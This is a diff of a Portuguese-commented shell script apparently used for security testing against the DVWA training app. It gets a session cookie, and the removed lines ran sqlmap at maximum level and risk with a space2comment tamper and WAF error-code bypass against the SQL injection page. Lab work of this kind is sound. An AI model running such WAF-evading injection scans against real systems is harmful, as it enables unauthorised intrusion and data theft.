@@ -24,26 +24,6 @@ curl -s -b "$COOKIE_FILE" -L \
   "https://$TARGET_HOST/security.php?security=low" > /dev/null
 
 # 2. Extrai valor do PHPSESSID do cookie file
-PHPSESSID=$(awk '/PHPSESSID/ {print \$7}' "$COOKIE_FILE")
+# 2. Extrai valor do PHPSESSID do cookie file
+PHPSESSID=$(awk '/PHPSESSID/ {print $7}' "$COOKIE_FILE")
 COOKIE="security=low; PHPSESSID=$PHPSESSID"
-
-# URL de injeção (usa HTTPS diretamente)
-INJECTION_URL="https://$TARGET_HOST/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
-
-echo "[*] Iniciando análise SQL Injection com sqlmap contra $INJECTION_URL..."
-
-# Executa sqlmap sem interatividade:
-# --batch para pular prompts, --answers="follow=Y" para seguir redirects,
-# --ignore-code para ignorar código HTTP 502 do WAF
-sqlmap \
-  --batch \
-  --answers="follow=Y" \
-  --ignore-code=502 \
-  --level=5 \
-  --risk=3 \
-  --tamper=space2comment \
-  -u "$INJECTION_URL" \
-  --cookie "$COOKIE"
-
-# Mensagem de fim de teste
-echo "[✓] Análise SQLi concluída."
